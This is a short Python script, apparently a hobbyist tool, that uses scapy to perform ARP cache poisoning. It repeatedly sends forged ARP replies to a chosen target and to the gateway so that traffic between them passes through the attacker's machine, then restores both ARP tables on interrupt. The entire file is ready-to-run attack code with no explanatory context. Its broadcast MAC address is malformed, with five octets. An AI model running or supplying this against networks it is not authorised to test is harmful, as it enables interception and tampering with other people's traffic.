#!/usr/bin/env python3
import time
import sys
import scapy.all as scapy
import argparse
from colorama import Fore

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', dest='target', required=True, help="Target IP to spoof")
    parser.add_argument('-s', dest='source', required=True, help="Source IP to spoof")
    return parser.parse_args()


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF")
    arp_req_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc
    
   
def spoof(trg_ip, spoof_ip):
    trg_mac = get_mac(trg_ip)
    packet = scapy.ARP(op=2, pdst=trg_ip, hwdst=trg_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_arp(dest_ip, src_ip):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    scapy.send(packet, count=4, verbose=False)

args = parse_args()
trg_ip = args.target
gateway_ip = args.source

try:
    sent_packets_count = 0
    while True:
        spoof(trg_ip, gateway_ip)
        spoof(gateway_ip, trg_ip)
        sent_packets_count = sent_packets_count + 2
        print(f"{Fore.GREEN}[+] Sending packets..." + str(sent_packets_count), end="\r", flush=True)
        time.sleep(2)
except KeyboardInterrupt:
    print(f"{Fore.RED}[-] CTRL+C caught.... Restoring ARP tables...")
    restore_arp(trg_ip, gateway_ip)
    restore_arp(gateway_ip, trg_ip)
    sys.exit(-1)

